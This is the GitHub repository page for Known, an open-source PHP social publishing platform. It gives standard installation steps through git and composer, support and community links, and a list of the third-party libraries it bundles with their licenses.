[![Known - A social group platform](https://camo.githubusercontent.com/ce595939648029ac6038d5aea564f79407bcdd44e23cee7da86fd94a15e21c6a/68747470733a2f2f776974686b6e6f776e2e636f6d2f696d672f686f6d652f73637265656e732e706e67)](https://camo.githubusercontent.com/ce595939648029ac6038d5aea564f79407bcdd44e23cee7da86fd94a15e21c6a/68747470733a2f2f776974686b6e6f776e2e636f6d2f696d672f686f6d652f73637265656e732e706e67)

## Installation

### One-click Known sites

If you want to install on your own web space, we recommend [Reclaim Hosting](https://portal.reclaimhosting.com/aff.php?aff=013),
which includes one-click Known installation. Known is also known to work on [DreamHost](https://dreamhost.com), a high-quality
web hosting provider.

### Installing

Known is under active development and requires PHP 8.1+ with selected extensions, together with a supported database backend. You can find detailed installation instructions here: <http://docs.withknown.com/en/latest/install/index.html>

#### Installing from packages

*Unofficial* install packages, which are periodically built from the latest code, are available: <https://www.marcus-povey.co.uk/known/>

#### Installing from Github

You can opt to check out the work-in-progress development code from the git repository: <https://github.com/idno/known>

* Check out the repo: `git clone https://github.com/idno/known.git`
* Fetch dependencies: `cd known; composer install`

#### Installing with composer

You can install Known directly from composer using: `composer create-project idno/known`

Optionally, you can install the latest bleeding edge code the same way: `composer create-project idno/known -s dev`

### Support us

**If you find this project useful, and you really want to support us, you can now fund us on [OpenCollective](https://opencollective.com/known).**

* [Star us on GitHub](https://github.com/idno/known)
* [Like us on alternativeto.net](http://alternativeto.net/software/known/)
* [Contribute](/idno/known/blob/dev/CONTRIBUTING.md)

### Get support

* Try the open source mailing list: <https://groups.google.com/forum/#!forum/known-dev>

## Community links

* Learn more and sign up to get updates: <https://withknown.com>
* Full project documentation: <http://docs.withknown.com/>
* Join the development mailing list: <https://groups.google.com/forum/#!forum/known-dev>
* Join the IRC channel: [#knownchat](https://webchat.freenode.net/?channels=knownchat) on Freenode

For details on contributing to the Known project, please read [CONTRIBUTING.md](/idno/known/blob/dev/CONTRIBUTING.md).

## Contributors

This project exists thanks to all the people who contribute. [[Contribute](/idno/known/blob/dev/CONTRIBUTING.md)].
[![](https://camo.githubusercontent.com/5b8de7bba4e1584d65f962a9a2c7390a962b7aef06b990eef8bd44ae3b2443fc/68747470733a2f2f6f70656e636f6c6c6563746976652e636f6d2f6b6e6f776e2f636f6e7472696275746f72732e7376673f77696474683d38393026627574746f6e3d66616c7365)](https://github.com/idno/known/graphs/contributors)

## Backers

Thank you to all our backers! 🙏 [[Become a backer](https://opencollective.com/known#backer)]

[![](https://camo.githubusercontent.com/b5c0ada3424a0bc0e9fad60e6f94ee8e96fa64273cf8bd0b0345286e297f8ba1/68747470733a2f2f6f70656e636f6c6c6563746976652e636f6d2f6b6e6f776e2f6261636b6572732e7376673f77696474683d383930)](https://opencollective.com/known#backers)

## Copyright and License

Except for included third-party projects, Known is (c) Known, Inc.

Unless otherwise stated, Known is licensed under the Apache Software License 2.0. See [LICENSE](/idno/known/blob/dev/LICENSE) for more information.

Known logos are (c) Known, Inc. Permission from Known, Inc is required to use the Known name or logo as part of any
project, product, service, domain or company name, except as included in official themes distributed by Known.

Logos of external services are (c) their respective owners. All rights reserved.

Third party libraries are licensed separately.

### Known also contains

* Twitter Bootstrap, which is distributed under the Apache 2.0 license. Source: <https://github.com/twitter/bootstrap>
* jQuery, which is distributed under the MIT License. Source: <https://github.com/jquery/jquery>
* Portions of Symfony, which is distributed under the MIT license.
  + EventDispatcher. Source: <https://github.com/symfony/EventDispatcher>
  + HttpFoundation. Source: <https://github.com/symfony/HttpFoundation>
  + Console. Source: <https://github.com/symfony/console>
* ToroPHP, which is distributed under the MIT License. Source: <https://github.com/anandkunal/ToroPHP/>
* Fork Awesome, which is distributed under the Open Font License, version 1.1: <https://github.com/ForkAwesome/Fork-Awesome>
* Steve Clay's AutoP, which is distributed under the MIT License. Source: <https://code.google.com/p/mrclay/>
* Aaron Parecki's Webmention Client, which is distributed under the Apache 2.0 license. Source: <https://github.com/aaronpk/mention-client>
* Barnaby Walters's Microformats 2 Parser, which is distributed under the MIT License. Source: <https://github.com/indieweb/php-mf2>
* FitVids.js, which is distributed under the WTFPL License. Source: <http://fitvidsjs.com/>
* Leaflet.js, which is distributed under the BSD 2-Clause License. Source: <http://leafletjs.com/>
* SwiftMailer, which is distributed under the MIT License. Source: <https://github.com/swiftmailer/swiftmailer>
* Antwort, an email template which is distributed under the MIT License. Source: <https://github.com/internations/antwort>
* Mention.js, a Bootstrap user at-mention library, which is distributed under the MIT License. Source: <https://github.com/jakiestfu/Mention.js>
* MediaElement.js, a cross-browser media player, which is distributed under the MIT License. Source: <https://github.com/johndyer/mediaelement>
* Simplepie, a feed parser, which is distributed under the BSD 3-Clause License. Source: <https://github.com/simplepie/simplepie/>
* Bootstrap Toggle, which is distributed under the MIT License. Source: <http://www.bootstraptoggle.com/>
* TinyMCE, a rich text editor, which is distributed under the LGPL License. Source: <https://github.com/tinymce/tinymce>
* The Paypal Bootstrap Accessibility Plugin, which is distributed under the BSD 3-Clause License. Source: <https://github.com/paypal/bootstrap-accessibility-plugin>
* HTMLPurifier, which is distributed under the LGPL License. Source: <http://htmlpurifier.org>
* Wavesurfer, which is distrubuted under a Creative Commons Attribution 3.0 Unported License. Source: <https://github.com/katspaugh/wavesurfer.js>
* MongoDB-PHP-Library, which is distributed under the Apache 2 Licence. Source: <https://github.com/mongodb/mongo-php-library>
* Exif-js, which is distributed under the MIT Licence. Source: <https://github.com/exif-js/exif-js>
* PHP-OGP, distributed under the GPL2 Licence. Source: <https://github.com/mapkyca/php-ogp>

## Thank you

[![BrowserStack Logo](https://user-images.githubusercontent.com/624104/52508260-d0daa180-2ba8-11e9-970c-3ef9596f6b4e.png)](https://www.browserstack.com/)

Thanks to [BrowserStack](https://www.browserstack.com/) for providing the infrastructure that allows us to test in real browsers.

## About

A social publishing platform.

[withknown.com/opensource](https://withknown.com/opensource "https://withknown.com/opensource")

### Topics

[php](/topics/php "Topic: php")
[cms](/topics/cms "Topic: cms")
[social-network](/topics/social-network "Topic: social-network")
[indieweb](/topics/indieweb "Topic: indieweb")
[cms-framework](/topics/cms-framework "Topic: cms-framework")

### Resources

[Readme](#readme-ov-file)
### License

[View license](#License-1-ov-file)
### Code of conduct

[Code of conduct](#coc-ov-file)
### Security policy

[Security policy](#security-ov-file)

[Activity](/idno/known/activity)
[Custom properties](/idno/known/custom-properties)
### Stars

[**1.1k**
stars](/idno/known/stargazers)
### Watchers

[**67**
watching](/idno/known/watchers)
### Forks

[**195**
forks](/idno/known/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fidno%2Fknown&report=idno+%28user%29)

## [Releases 27](/idno/known/releases)

[1.6.2
Latest

Jan 3, 2024](/idno/known/releases/tag/1.6.2)
[+ 26 releases](/idno/known/releases)

## Sponsor this project

* ![open_collective](https://github.githubassets.com/assets/open_collective-0a706523753d.svg)
  [opencollective.com/**known**](https://opencollective.com/known)

## [Packages 0](/orgs/idno/packages?repo_name=known)

No packages published

## [Contributors 68](/idno/known/graphs/contributors)

[+ 54 contributors](/idno/known/graphs/contributors)

## Languages

* [PHP
  85.5%](/idno/known/search?l=php)
* [SCSS
  5.7%](/idno/known/search?l=scss)
* [CSS
  5.5%](/idno/known/search?l=css)
* [JavaScript
  3.1%](/idno/known/search?l=javascript)
* [Hack
  0.1%](/idno/known/search?l=hack)
* [Dockerfile
  0.1%](/idno/known/search?l=dockerfile)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


